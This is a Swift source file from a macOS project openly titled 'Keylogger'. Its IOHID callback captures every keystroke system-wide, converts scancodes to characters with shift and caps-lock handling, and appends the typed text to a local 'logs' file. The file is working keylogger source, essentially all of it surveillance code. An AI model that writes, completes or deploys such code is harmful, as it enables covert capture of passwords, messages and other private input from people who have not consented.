//
//  CallbackFunctions.swift
//  Keylogger
//
//  Created by Skrew Everything on 16/01/17.
//  Copyright © 2017 Skrew Everything. All rights reserved.
//

import Foundation
import Cocoa

class CallbackFunctions
{
    static var CAPSLOCK = false
    static var SHIFT = false
    static var calander = Calendar.current
    //    static var prev = ""
    static var command = false
    
    static let Handle_IOHIDInputValueCallback: IOHIDValueCallback = { context, result, sender, device in // this is the good stuff
        
        let mySelf = Unmanaged<Keylogger>.fromOpaque(context!).takeUnretainedValue()
        let elem: IOHIDElement = IOHIDValueGetElement(device );
        //        var test: Bool
        if (IOHIDElementGetUsagePage(elem) != 0x07)
        {
            return
        }
        let scancode = IOHIDElementGetUsage(elem);
        if (scancode < 4 || scancode > 231)
        {
            return
        }
        let pressed = IOHIDValueGetIntegerValue(device );
//        var dateFolder = "\(calander.component(.day, from: Date()))-\(calander.component(.month, from: Date()))-\(calander.component(.year, from: Date()))"
//        var path = Keylogger.keylogs.appendingPathComponent(dateFolder)
//        if !FileManager.default.fileExists(atPath: path.path)
//        {
//            do
//            {
//                try FileManager.default.createDirectory(at: path , withIntermediateDirectories: false, attributes: nil)
//            }
//            catch
//            {
//                print("Can't Create Folder")
//            }
//        }
        let fileName = Keylogger.keylogs.appendingPathComponent("logs").path
        //        if CallbackFunctions.prev == fileName
        //        {
        //            test = false
        //        }
        //        else
        //        {
        //            test = true
        //            CallbackFunctions.prev = fileName
        //        }
        if !FileManager.default.fileExists(atPath: fileName)
        {
            if !FileManager.default.createFile(atPath: fileName, contents: nil, attributes: nil)
            {
                print("Can't Create File")
            }
        }
        let fh = FileHandle.init(forWritingAtPath: fileName)
        fh?.seekToEndOfFile()
        //        if test
        //        {
        //            let timeStamp = "\n" + Date().description(with: Locale.current) + "\n"
        //            fh?.write(timeStamp.data(using: .utf8)!)
        //        }
        
        Outside:if pressed == 1 // keydown
        {
            if scancode == 57 // Capslock
            {
                CallbackFunctions.CAPSLOCK = !CallbackFunctions.CAPSLOCK
                break Outside
            }
            if scancode == 225 { // Shift
                CallbackFunctions.SHIFT = true
                break Outside
            }
            if scancode >= 224 && scancode <= 231 || command
            {
//                print(scancode)
                command = true
//                print("command")
                //                fh?.write( (mySelf.keyMap[scancode]![0] + "(").data(using: .utf8)!)
                //                print((mySelf.keyMap[scancode]![0] + "(").data(using: .utf8)!)
                break Outside
            }
            if CallbackFunctions.CAPSLOCK || CallbackFunctions.SHIFT // Show uppercase
            {
                fh?.write(mySelf.keyMap[scancode]![1].data(using: .utf8)!)
                print(mySelf.keyMap[scancode]![1].data(using: .utf8)!)
            }
            else // Show lowercase
            {
                fh?.write(mySelf.keyMap[scancode]![0].data(using: .utf8)!)
                print(mySelf.keyMap[scancode]![0].data(using: .utf8)!)
            }
        }
        else // keyup
        {
            if scancode == 225 {
                CallbackFunctions.SHIFT = false
                break Outside
            }
            if scancode >= 224 && scancode <= 231
            {
                print(scancode)
                command = false
                print("end command")
                //                fh?.write(")".data(using: .utf8)!)
                //                print(")".data(using: .utf8)!)
            }
        }
    }
}
